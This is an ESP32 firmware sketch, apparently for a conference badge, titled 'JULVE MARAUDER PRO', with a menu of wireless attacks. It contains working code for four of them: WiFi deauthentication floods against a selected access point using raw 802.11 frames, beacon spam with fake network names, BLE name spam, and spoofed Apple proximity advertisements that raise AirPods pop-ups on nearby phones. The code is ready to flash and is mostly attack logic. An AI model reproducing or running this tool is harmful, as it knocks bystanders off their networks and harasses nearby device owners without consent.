#include <TFT_eSPI.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

TFT_eSPI tft = TFT_eSPI();

// --- CONFIGURACIÓN DE HARDWARE (Rooted Badge) ---
const int PIN_UP = 15;
const int PIN_DOWN = 27;
const int PIN_START = 33;  // Confirmar / Atacar
const int PIN_SELECT = 13; // Atrás / Salir

// --- VARIABLES DE MENÚ ---
const char* menuOptions[] = {
  "1. WiFi Scan & Deauth", 
  "2. WiFi Beacon Spam", 
  "3. BT Name Spam (Settings)", 
  "4. BT Apple Pop-ups", 
  "5. Creditos", 
  "6. Reiniciar"
};
int currentSelect = 0;
int totalOptions = 6;
bool inMenu = true;

const char* spamNames[] = {"RootedCON_2026", "Pwned_By_Julve", "FBI_Surveillance", "Capibara_rulez", "ERROR_SYSTEM_404"};

void setup() {
  Serial.begin(115200);
  pinMode(21, OUTPUT); digitalWrite(21, HIGH); // Luz pantalla
  pinMode(PIN_UP, INPUT_PULLUP);
  pinMode(PIN_DOWN, INPUT_PULLUP);
  pinMode(PIN_START, INPUT_PULLUP);
  pinMode(PIN_SELECT, INPUT_PULLUP);

  tft.init();
  tft.setRotation(1);
  WiFi.mode(WIFI_AP_STA);
  drawMenu();
}

void loop() {
  if (inMenu) {
    if (digitalRead(PIN_UP) == LOW) { currentSelect = (currentSelect - 1 + totalOptions) % totalOptions; drawMenu(); delay(150); }
    if (digitalRead(PIN_DOWN) == LOW) { currentSelect = (currentSelect + 1) % totalOptions; drawMenu(); delay(150); }
    if (digitalRead(PIN_START) == LOW) { executeOption(currentSelect); delay(250); }
  }
}

void drawMenu() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN);
  tft.drawRect(0, 0, 160, 18, TFT_GREEN);
  tft.drawCentreString("JULVE MARAUDER PRO", 80, 2, 1);
  for (int i = 0; i < totalOptions; i++) {
    int y = 22 + (i * 17);
    if (i == currentSelect) {
      tft.fillRect(2, y - 1, 156, 15, TFT_GREEN);
      tft.setTextColor(TFT_BLACK);
    } else {
      tft.setTextColor(TFT_WHITE);
    }
    tft.drawString(menuOptions[i], 5, y);
  }
}

void executeOption(int opt) {
  inMenu = false;
  if (opt == 0) wifiScanAndSelect();
  else if (opt == 1) wifiBeaconSpam();
  else if (opt == 2) btNameSpam();
  else if (opt == 3) btApplePopups();
  else if (opt == 4) showCredits();
  else ESP.restart();
  inMenu = true;
  drawMenu();
}

// --- 1. WIFI SCAN & DEAUTH SELECTIVO ---
void wifiScanAndSelect() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN);
  tft.drawCentreString("Escaneando...", 80, 50, 1);
  
  int n = WiFi.scanNetworks();
  if (n <= 0) {
    tft.drawCentreString("No se han hallado redes", 80, 70, 1);
    delay(2000);
    return;
  }

  int scroll = 0;
  while(true) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_YELLOW);
    tft.drawString("Objetivo (Back=Exit):", 5, 2);
    
    for (int i = 0; i < min(n, 6); i++) {
      int y = 18 + (i * 15);
      if (i == scroll) {
        tft.fillRect(0, y - 1, 160, 14, TFT_WHITE);
        tft.setTextColor(TFT_BLACK);
      } else {
        tft.setTextColor(TFT_GREEN);
      }
      tft.drawString(WiFi.SSID(i).substring(0, 14), 5, y);
    }

    if (digitalRead(PIN_UP) == LOW) { scroll = (scroll - 1 + n) % n; delay(150); }
    if (digitalRead(PIN_DOWN) == LOW) { scroll = (scroll + 1) % n; delay(150); }
    if (digitalRead(PIN_SELECT) == LOW) return;
    if (digitalRead(PIN_START) == LOW) { 
      deauthTarget(scroll); 
      return; 
    }
    delay(50);
  }
}

void deauthTarget(int index) {
  uint8_t bssid[6];
  memcpy(bssid, WiFi.BSSID(index), 6);
  int ch = WiFi.channel(index);
  String ssid = WiFi.SSID(index);

  tft.fillScreen(TFT_RED);
  tft.setTextColor(TFT_WHITE);
  tft.drawCentreString("DEAUTHING...", 80, 10, 2);
  tft.drawString("Objetivo: " + ssid, 10, 45);
  tft.drawString("Canal: " + String(ch), 10, 60);
  tft.setTextColor(TFT_YELLOW);
  tft.drawString("SELECT para salir", 10, 110);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  // Paquete Deauth
  uint8_t pkt[26] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 
    0x00, 0x00, 0x01, 0x00
  };

  while(digitalRead(PIN_SELECT) == HIGH) {
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
    delay(5);
  }
  esp_wifi_set_promiscuous(false);
}

// --- 2. WIFI BEACON SPAM (PRO: Ahora con tags de canal) ---
void wifiBeaconSpam() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_RED);
  tft.drawCentreString("WIFI SPAM ACTIVE", 80, 10, 1);
  tft.setTextColor(TFT_WHITE);
  tft.drawString("Inundando con redes falsas", 5, 40);
  tft.setTextColor(TFT_YELLOW);
  tft.drawString("SELECT para salir", 10, 110);

  esp_wifi_set_promiscuous(true);
  while(digitalRead(PIN_SELECT) == HIGH) {
    for (int i = 0; i < 5; i++) {
      uint8_t pkt[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04 };
      int ssid_len = strlen(spamNames[i]);
      pkt[36] = 0x00; pkt[37] = ssid_len;
      memcpy(&pkt[38], spamNames[i], ssid_len);
      int pos = 38 + ssid_len;
      // Supported Rates
      uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
      memcpy(&pkt[pos], rates, 10); pos += 10;
      // DS Parameter (Channel 6)
      uint8_t ds[] = { 0x03, 0x01, 0x06 };
      memcpy(&pkt[pos], ds, 3); pos += 3;
      
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
      delay(2);
    }
  }
  esp_wifi_set_promiscuous(false);
}

// --- 3. BT NAME SPAM (Visible en Ajustes de otros móviles) ---
void btNameSpam() {
  tft.fillScreen(TFT_BLUE);
  tft.setTextColor(TFT_WHITE);
  tft.drawCentreString("SETTINGS BT SPAM", 80, 10, 1);
  tft.drawString("Cambia nombres cada 2s", 10, 40);
  tft.setTextColor(TFT_YELLOW);
  tft.drawString("SELECT para salir", 10, 110);

  BLEDevice::init("Iniciando...");
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  
  int nameIdx = 0;
  long lastSwitch = 0;

  while(digitalRead(PIN_SELECT) == HIGH) {
    if (millis() - lastSwitch > 2000) {
      pAdv->stop();
      BLEAdvertisementData oData;
      oData.setFlags(0x06); // Discoverable
      oData.setName(spamNames[nameIdx]);
      pAdv->setAdvertisementData(oData);
      pAdv->start();

      tft.fillRect(0, 65, 160, 30, TFT_BLUE);
      tft.drawCentreString(spamNames[nameIdx], 80, 70, 2);
      
      nameIdx = (nameIdx + 1) % 5;
      lastSwitch = millis();
    }
    delay(50);
  }
  pAdv->stop();
  BLEDevice::deinit(true);
}

// --- 4. BT APPLE POP-UPS (Ventanas Airpods) ---
void btApplePopups() {
  tft.fillScreen(TFT_DARKCYAN);
  tft.setTextColor(TFT_WHITE);
  tft.drawCentreString("APPLE POP-UP ATTACK", 80, 10, 1);
  tft.drawString("Triggering AirPods Pro...", 10, 50);
  tft.setTextColor(TFT_YELLOW);
  tft.drawString("SELECT para salir", 10, 110);

  BLEDevice::init("AirPods Pro");
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  uint8_t apple_data[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45};
  BLEAdvertisementData oData;
  oData.addData(std::string((char*)apple_data, 16));
  pAdv->setAdvertisementData(oData);

  while(digitalRead(PIN_SELECT) == HIGH) {
    pAdv->start();
    delay(200);
    pAdv->stop();
    delay(100);
  }
  BLEDevice::deinit(true);
}

// --- 5. CREDITOS ---
void showCredits() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN);
  tft.drawCentreString("JULVE MARAUDER", 80, 5, 2);
  tft.setTextColor(TFT_CYAN);
  tft.drawString("Github:", 5, 35);
  tft.setTextColor(TFT_WHITE);
  tft.drawString("github.com/DonJulve", 5, 45);
  tft.setTextColor(TFT_CYAN);
  tft.drawString("LinkedIn:", 5, 65);
  tft.setTextColor(TFT_WHITE);
  tft.drawString("in/javier-julve-yubero", 5, 75);
  tft.setTextColor(TFT_YELLOW);
  tft.drawString("SELECT para volver", 15, 115);
  while(digitalRead(PIN_SELECT) == HIGH) { delay(10); }
}
